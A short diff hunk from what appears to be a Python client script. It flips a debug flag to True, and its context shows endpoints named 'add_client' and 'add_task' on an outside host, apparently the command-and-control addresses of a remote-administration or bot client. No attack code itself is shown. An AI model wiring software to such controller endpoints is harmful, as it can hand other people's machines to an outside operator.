@@ -72,7 +72,7 @@ __DATA__    = {'add_client': 'https://snapchat.sex/client.php',
                'add_task'  : 'https://snapchat.sex/task.php'}
 
 # enable/disable debugging output
-__DEBUG__   = False
+__DEBUG__   = True
 
 # comment/uncomment the following line to disable/enable color 
 colorama.init(autoreset=True)
